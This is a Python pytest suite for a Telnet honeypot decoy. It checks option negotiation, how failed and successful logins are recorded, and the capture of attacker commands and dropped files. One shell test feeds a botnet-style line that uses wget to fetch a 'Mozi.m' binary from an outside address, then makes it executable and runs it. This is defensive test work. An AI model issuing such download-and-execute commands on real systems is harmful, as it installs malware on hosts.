"""The Telnet decoy: negotiation, login policy, and the shared shell."""

import asyncio

import pytest

from honeypot.core.config import config
from honeypot.core.identity import reset_identity
from honeypot.core.session import session_manager
from honeypot.emulators import ssh as ssh_module
from honeypot.emulators.telnet import (
    DO, DONT, IAC, OPT_ECHO, OPT_SGA, SB, SE, WILL, WONT,
    TelnetHoneypot, TelnetLineReader,
)

PORT = 24323


@pytest.fixture(autouse=True)
def _env(tmp_path, monkeypatch):
    monkeypatch.setattr(config, "bind_address", "127.0.0.1")
    monkeypatch.setattr(config, "enable_anti_fingerprinting", False)
    monkeypatch.setattr(config, "session_capture_dir", str(tmp_path / "sessions"))
    monkeypatch.setattr(config, "file_capture_dir", str(tmp_path / "uploads"))
    ssh_module._failures_by_ip.clear()
    reset_identity()
    yield
    reset_identity()


@pytest.fixture
def ingested(monkeypatch):
    captured = []

    async def capture(session):
        captured.append(session.to_backend_payload(1))

    monkeypatch.setattr(session_manager, "_send_to_backend", capture)
    return captured


@pytest.fixture
async def telnet():
    honeypot = TelnetHoneypot(port=PORT)
    await honeypot.start()
    yield honeypot
    await honeypot.stop()


async def _read_until(reader, token: bytes, timeout=5) -> bytes:
    data = b""
    try:
        while token not in data:
            chunk = await asyncio.wait_for(reader.read(4096), timeout=timeout)
            if not chunk:
                break
            data += chunk
    except asyncio.TimeoutError:
        pass
    return data


async def _login(reader, writer, user=b"root", password=b"root"):
    # Behave like a character-mode client: agree to the server's offers.
    writer.write(bytes([IAC, DO, OPT_ECHO, IAC, DO, OPT_SGA, IAC, WILL, OPT_SGA]))
    await _read_until(reader, b"login: ")
    writer.write(user + b"\r\n")
    await _read_until(reader, b"Password: ")
    writer.write(password + b"\r\n")
    await writer.drain()
    return await _read_until(reader, b"$ ") if user != b"root" else await _read_until(reader, b"# ")


class TestLineReader:
    def test_strips_negotiation_and_answers_it(self):
        parser = TelnetLineReader()
        text = parser.feed(bytes([IAC, DO, OPT_ECHO, IAC, WILL, 24, IAC, DO, 31]) + b"root\r\n")
        assert text == b"root\n"
        # WILL for an option we do not want → DONT; DO for one we do not provide → WONT.
        assert bytes([IAC, DONT, 24]) in parser.replies
        assert bytes([IAC, WONT, 31]) in parser.replies
        # DO ECHO needs no reply: the server already WILLed it.
        assert bytes([IAC, WILL, OPT_ECHO]) not in parser.replies

    def test_subnegotiation_is_swallowed_even_across_segments(self):
        parser = TelnetLineReader()
        first = parser.feed(bytes([IAC, SB, 31, 0, 80, 0]))
        second = parser.feed(bytes([24, IAC, SE]) + b"ls\r\x00")
        assert first == b"" and second == b"ls\n"
        assert ("SB", 31) in parser.negotiations

    def test_escaped_iac_is_data(self):
        parser = TelnetLineReader()
        assert parser.feed(bytes([IAC, IAC]) + b"x\r\n") == b"\xffx\n"

    def test_cr_lf_and_cr_nul_both_end_a_line(self):
        parser = TelnetLineReader()
        assert parser.feed(b"a\r\nb\r\x00c\rd") == b"a\nb\nc\nd"

    def test_backspace_edits_the_line(self):
        assert TelnetHoneypot._apply_backspaces(b"lsx\x08 -la\x7f\x7f") == b"ls -"


class TestLogin:
    async def test_failed_then_successful_attempts_are_recorded(self, telnet, ingested):
        reader, writer = await asyncio.open_connection("127.0.0.1", PORT)
        writer.write(bytes([IAC, DO, OPT_ECHO, IAC, DO, OPT_SGA, IAC, WILL, OPT_SGA]))
        banner = await _read_until(reader, b"login: ")
        assert b"Ubuntu" in banner and bytes([IAC, WILL, OPT_ECHO]) in banner
        writer.write(b"root\r\n")
        await _read_until(reader, b"Password: ")
        writer.write(b"wrong-guess\r\n")
        refused = await _read_until(reader, b"login: ")
        assert b"Login incorrect" in refused
        writer.write(b"root\r\n")
        await _read_until(reader, b"Password: ")
        writer.write(b"root\r\n")
        prompt = await _read_until(reader, b"# ")
        assert b"Last login" in prompt and b"root@" in prompt
        writer.write(b"exit\r\n")
        await writer.drain()
        await _read_until(reader, b"logout")
        writer.close()
        await asyncio.sleep(0.2)
        assert len(ingested) == 1
        payload = ingested[0]
        assert payload["protocol"] == "telnet"
        creds = payload["credentials"]
        assert [c["success"] for c in creds] == [False, True]
        assert creds[0]["password"] == "wrong-guess"
        assert payload["failed_logins"] == 1

    async def test_soft_accept_after_repeated_failures(self, telnet, ingested):
        reader, writer = await asyncio.open_connection("127.0.0.1", PORT)
        writer.write(bytes([IAC, DO, OPT_ECHO, IAC, DO, OPT_SGA, IAC, WILL, OPT_SGA]))
        await _read_until(reader, b"login: ")
        for _ in range(3):
            writer.write(b"admin\r\n")
            await _read_until(reader, b"Password: ")
            writer.write(b"nope\r\n")
            await _read_until(reader, b"login: ")
        writer.write(b"admin\r\n")
        await _read_until(reader, b"Password: ")
        writer.write(b"still-nope\r\n")
        prompt = await _read_until(reader, b"$ ")
        assert b"admin@" in prompt
        writer.close()
        await asyncio.sleep(0.2)
        assert [c["success"] for c in ingested[0]["credentials"]] == [False, False, False, True]

    async def test_eof_at_the_password_prompt_ends_the_session(self, telnet, ingested):
        reader, writer = await asyncio.open_connection("127.0.0.1", PORT)
        await _read_until(reader, b"login: ")
        writer.write(b"root\r\n")
        await _read_until(reader, b"Password: ")
        writer.close()
        await asyncio.sleep(0.3)
        assert len(ingested) == 1
        assert ingested[0]["credentials"] == []
        # Ended, not leaked: other suites may hold their own active sessions.
        active = {s.session_id for s in await session_manager.get_active_sessions()}
        assert ingested[0]["session_id"] not in active


class TestShell:
    async def test_busybox_probe_and_download_are_answered_and_recorded(self, telnet, ingested):
        reader, writer = await asyncio.open_connection("127.0.0.1", PORT)
        await _login(reader, writer)
        writer.write(b"/bin/busybox ECCHI\r\n")
        out = await _read_until(reader, b"# ")
        assert b"ECCHI: applet not found" in out
        writer.write(b"cd /tmp; wget http://198.51.100.9/bins/Mozi.m -O Mozi.m; chmod 777 Mozi.m; ./Mozi.m\r\n")
        out = await _read_until(reader, b"# ")
        assert b"Mozi.m" in out
        writer.write(b"uname -a\r\n")
        out = await _read_until(reader, b"# ")
        assert b"Linux" in out
        writer.write(b"exit\r\n")
        await writer.drain()
        await _read_until(reader, b"logout")
        writer.close()
        await asyncio.sleep(0.3)
        payload = ingested[0]
        commands = payload["commands"]
        assert commands[0] == "/bin/busybox ECCHI"
        assert any(c.startswith("cd /tmp; wget") for c in commands)
        downloads = [e for e in payload["events"] if e.get("event_type") == "file_download"]
        assert downloads and downloads[0]["url"] == "http://198.51.100.9/bins/Mozi.m"
        transcript = payload["transcript"]
        assert transcript[0]["command"] == "/bin/busybox ECCHI"
        assert "applet not found" in transcript[0]["output"]
        assert {"command", "output", "exit_code", "timestamp"} <= set(transcript[0])
        assert payload["keystroke_count"] > 0

    async def test_shell_written_file_is_captured(self, telnet, ingested):
        reader, writer = await asyncio.open_connection("127.0.0.1", PORT)
        await _login(reader, writer)
        writer.write(b"echo IyEvYmluL3NoCmVjaG8gaGkK | base64 -d > /tmp/x.sh\r\n")
        await _read_until(reader, b"# ")
        writer.write(b"exit\r\n")
        await writer.drain()
        writer.close()
        await asyncio.sleep(0.4)
        uploads = ingested[0]["uploads"]
        assert uploads and uploads[0]["filename"] == "x.sh"

    async def test_line_mode_client_without_sga_is_not_double_echoed(self, telnet, ingested):
        reader, writer = await asyncio.open_connection("127.0.0.1", PORT)
        # A client that refuses character mode sends whole lines itself.
        writer.write(bytes([IAC, WONT, OPT_SGA, IAC, DONT, OPT_ECHO]))
        await _read_until(reader, b"login: ")
        writer.write(b"root\r\n")
        data = await _read_until(reader, b"Password: ")
        assert b"root" not in data
        writer.close()
        await asyncio.sleep(0.2)
